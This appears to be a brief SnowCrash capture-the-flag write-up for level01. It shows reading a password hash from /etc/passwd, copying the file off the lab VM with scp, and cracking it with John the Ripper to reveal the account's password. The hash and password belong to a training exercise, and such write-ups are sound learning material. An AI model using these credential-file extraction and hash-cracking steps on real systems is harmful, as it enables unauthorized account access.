I checked /etc/passwd file and find the hash password of login 'flag01'.
```shell
level01@SnowCrash:~$ grep 'flag01' /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```
I sent this file to local machine with 'src' command:
```shell
jheat@jheat:~/SnowCrash$ scp -P 4242 level00@192.168.56.101:../../../etc/passwd ./level01/Resources/
```
Installed John the Ripper to crack hash password tool on my Linux:
```shell
jheat@jheat:~/SnowCrash$ sudo apt install john
```
Open passwd file with John tool:
```shell
jheat@jheat:~/SnowCrash/level01/Resources$ john passwd --show
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

1 password hash cracked, 0 left
```
Took password ti flag01: abcdefg